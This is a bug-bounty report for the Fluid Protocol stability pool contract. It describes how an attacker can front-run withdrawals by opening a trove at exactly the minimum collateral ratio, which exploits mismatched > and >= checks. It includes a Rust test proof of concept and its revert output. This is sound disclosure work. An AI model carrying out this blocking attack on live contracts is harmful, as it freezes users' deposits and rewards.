# #37382 \[SC-Insight] Inconsistent Collateral Ratio Checks in Stability Pool Withdrawals Lead to Fund-

**Submitted on Dec 3rd 2024 at 16:14:10 UTC by @InquisitorScythe for** [**IOP | Fluid Protocol**](https://immunefi.com/audit-competition/iop-fluid-protocol)

* **Report ID:** #37382
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/Hydrogen-Labs/fluid-protocol/tree/main/contracts/stability-pool-contract/src/main.sw>
* **Impacts:**
  * Permanent freezing of funds
  * Permanent freezing of unclaimed yield

## Description

## Brief/Intro

In the `withdraw_from_stability_pool` function from `stability-pool-contract/src/main.sw`, there is an initial check called `require_no_undercollateralized_troves`. Unfortunately, this check condition is inappropriate, allowing attackers to prevent legitimate withdrawal operations through front-running at any time. As a result, users' USDF and generated rewards remain locked in the stability pool and cannot be withdrawn.

## Vulnerability Details

A critical vulnerability exists in the stability pool contract where users' ability to withdraw their USDF funds can be maliciously blocked through a front-running attack. This is caused by an inconsistency between collateral ratio checks in different contract functions.

The vulnerability stems from the `withdraw_from_stability_pool` function's implementation, specifically in its `require_no_undercollateralized_troves` check:

```
#[storage(read)]
fn require_no_undercollateralized_troves() {
    // ... initialization code ...
    require(
        last == Identity::Address(Address::zero()) || trove_manager
            .get_current_icr(last, price) > MCR, // Critical: Uses strict inequality
        "StabilityPool: There are undercollateralized troves",
    );
    // ... remaining code ...
}
```

The key issue lies in the inequality operator (>) used to compare the Individual Collateral Ratio (ICR) with the Minimum Collateral Ratio (MCR). However, the open\_trove function uses a different comparison:

```
fn require_at_least_mcr(icr: u64) {
    require(
        icr >= MCR,  // Uses >= instead of >
        "Borrow Operations: Minimum collateral ratio not met",
    );
}
```

This inconsistency creates an exploitable condition:

1. Users can legitimately open or adjust troves with exactly MCR (ICR = MCR)
2. The stability pool withdrawal function will revert if any trove has ICR ≤ MCR An attacker can exploit this by:
3. Monitoring the mempool for stability pool withdrawal transactions
4. Front-running these transactions by opening a trove with ICR = MCR
5. This causes the victim's withdrawal transaction to fail due to the strict inequality check As a result, attackers can effectively prevent specific users from withdrawing their USDF and accumulated gains from the stability pool, creating a denial-of-service condition for legitimate withdrawals. It is possible to lock specific users' fund in the pool as long as possible with little cause.

### Possible Fix

Relaxation of withdrawal restrictions, allow user withdraw their fund even when undercollateralized troves exists.

## Impact Details

The vulnerability creates a severe denial-of-service condition that directly impacts both users' funds and the protocol's stability. The impact can be broken down into several critical areas:

### Direct Financial Impact

* Users' USDF deposits and earned collateral rewards become inaccessible in the Stability Pool
* Attackers can selectively target and lock specific users' funds indefinitely
* Loss of potential earnings from FPT token distributions and collateral rewards
* The affected amounts could be significant, as the Stability Pool typically holds substantial deposits

### Protocol Stability Risks

1. Liquidity Impairment:
   * Reduced effectiveness of the Stability Pool as the first line of defense for liquidations
   * Decreased Total Collateral Ratio (TCR) protection capability
   * Potential cascading effect on the protocol's ability to maintain stable operations
2. Systemic Risks:
   * Loss of user confidence leading to reduced deposits in the Stability Pool
   * Increased vulnerability to bank run scenarios
   * Compromised liquidation mechanisms if Stability Pool liquidity becomes insufficient

### Long-term Protocol Damage

* Reputational damage to Fluid Protocol
* Reduced user trust leading to decreased protocol adoption
* Potential exodus of existing users due to fund accessibility concerns
* Negative impact on protocol's competitive position in the DeFi ecosystem

The severity is heightened because:

1. The attack can be executed at any time
2. It requires very low cost to execute
3. The impact is persistent until protocol code is updated
4. There's no immediate workaround for affected users

This vulnerability falls within the program's scope as it directly impacts fund accessibility and protocol stability, warranting a critical-severity classification.

## References

None

## Proof of Concept

## Proof of Concept

Add following test in `contracts/stability-pool-contract/tests/functions/failure.rs`

```
#[tokio::test]
#[tokio::test]
async fn fails_withdraw_underattack() {
    let (contracts, admin, mut wallets) = setup_protocol(4, false, false).await;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[0].mock_pyth_oracle,
        pyth_price_feed(1),
    )
    .await;

    // Admin opens a trove and deposits to stability pool
    borrow_operations_utils::mint_token_and_open_trove(
        admin.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        6_000 * PRECISION,
        3_000 * PRECISION,
    )
    .await;

    let init_stability_deposit = 2_000 * PRECISION;
    stability_pool_abi::provide_to_stability_pool(
        &contracts.stability_pool,
        &contracts.community_issuance,
        &contracts.usdf,
        &contracts.asset_contracts[0].asset,
        init_stability_deposit,
    )
    .await
    .unwrap();

    let attacker_wallet = wallets.pop().unwrap();
    // Open one trove that icr = MCR
    borrow_operations_utils::mint_token_and_open_trove(
        attacker_wallet.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        135675  * 10000000, // 1356.75
        100000  * 10000000, // 1000
        // 1346.75 / (1000* 1.005 ) = 1.35
    )
    .await;

    let icr = trove_manager_abi::get_nominal_icr(
        &contracts.asset_contracts[0].trove_manager,
        Identity::Address(attacker_wallet.address().into()),
    )
    .await
    .value;

    println!("Attacker Initial ICR: {}", icr);


    // Admin try to withdraw from stability pool but failed
    let withdraw_result = stability_pool_abi::withdraw_from_stability_pool(
        &contracts.stability_pool,
        &contracts.community_issuance,
        &contracts.usdf,
        &contracts.asset_contracts[0].asset,
        &contracts.sorted_troves,
        &contracts.asset_contracts[0].oracle,
        &contracts.asset_contracts[0].mock_pyth_oracle,
        &contracts.asset_contracts[0].mock_redstone_oracle,
        &contracts.asset_contracts[0].trove_manager,
        1_000 * PRECISION,
    )
    .await
    .unwrap();

}
```

run `cargo test -- --nocapture fails_withdraw_underattack`, output like:

```
Deploying core contracts...
Initializing core contracts...
Attacker Initial ICR: 1350000000
thread 'functions::failure::fails_withdraw_underattack' panicked at contracts/stability-pool-contract/tests/functions/failure.rs:287:6:
called `Result::unwrap()` on an `Err` value: Transaction(Reverted { reason: "AsciiString { data: \"StabilityPool: There are undercollateralized troves\" }", revert_id: 18446744073709486080, receipts: [Call { id: 0000000000000000000000000000000000000000000000000000000000000000, to: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1999782, param1: 10480, param2: 10516, pc: 14992, is: 14992 }, Call { id: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, to: dacc1a9d034b06ed38cc88a81716c63be6e96af55638bf4d812b80065a0aa0fb, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1988415, param1: 67104992, param2: 67103968, pc: 130192, is: 130192 }, Call { id: dacc1a9d034b06ed38cc88a81716c63be6e96af55638bf4d812b80065a0aa0fb, to: 470221c712db655d85d8a3b753813c6bb0217baadd2fcd10c44c798eb2d6e764, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1984436, param1: 67101344, param2: 67100320, pc: 182137, is: 182137 }, ReturnData { id: 470221c712db655d85d8a3b753813c6bb0217baadd2fcd10c44c798eb2d6e764, ptr: 67097760, len: 28, digest: a9dd65fcff83b6bccf652da94d61edd8632ff002061afc77e498266005f6be0c, pc: 184173, is: 182137, data: Some(00000000000000000000000900...) }, ReturnData { id: dacc1a9d034b06ed38cc88a81716c63be6e96af55638bf4d812b80065a0aa0fb, ptr: 67095968, len: 8, digest: 59f603c39018dc65fbf3007d91985355b0e27df2993aab3c4a9e4b5ea36c5996, pc: 147476, is: 130192, data: Some(000000003b9aca00) }, Call { id: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, to: 07e7d97ebfe3a075049fa9606e2b4311e754f6edcfc06d5ead8a0e9a17116ccd, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1978376, param1: 67094688, param2: 67093664, pc: 129632, is: 129632 }, ReturnData { id: 07e7d97ebfe3a075049fa9606e2b4311e754f6edcfc06d5ead8a0e9a17116ccd, ptr: 67090272, len: 40, digest: 2e0cc4f65421eb00c527deb8171afd28931d36a7673d00ddbb7ccbfa672a70d4, pc: 150624, is: 129632, data: Some(0000000000000000bdaad6a89e...) }, Call { id: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, to: a62d03ea269befad62607da0ddf44fb5de7a9ebe2b71f0138e56d01da3c7a6ff, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1970979, param1: 67089248, param2: 67088224, pc: 129632, is: 129632 }, ReturnData { id: a62d03ea269befad62607da0ddf44fb5de7a9ebe2b71f0138e56d01da3c7a6ff, ptr: 67083089, len: 8, digest: 8fa3199efd886c0c617c0e4ec573081d7d41cef417c75c57982f8c0c2bda2f0b, pc: 160508, is: 129632, data: Some(0000000050775d80) }, LogData { id: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, ra: 0, rb: 10098701174489624218, ptr: 67082065, len: 59, digest: f639b7c06eaaab629f291059fce4bc05b62f7592bf3f0071805b3bdae77d58de, pc: 41120, is: 14992, data: Some(00000000000000335374616269...) }, Revert { id: 97aad73cda23682bc048db771fbfd24b504bfbfc268d0a4c17d7a5d849cbbb24, ra: 18446744073709486080, pc: 41128, is: 14992 }, ScriptResult { result: Revert, gas_used: 106724 }] })
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
test functions::failure::fails_withdraw_underattack ... FAILED

failures:

failures:
    functions::failure::fails_withdraw_underattack

test result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 11 filtered out; finished in 9.73s
```

The withdraw operation is blocked by `StabilityPool: There are undercollateralized troves`.
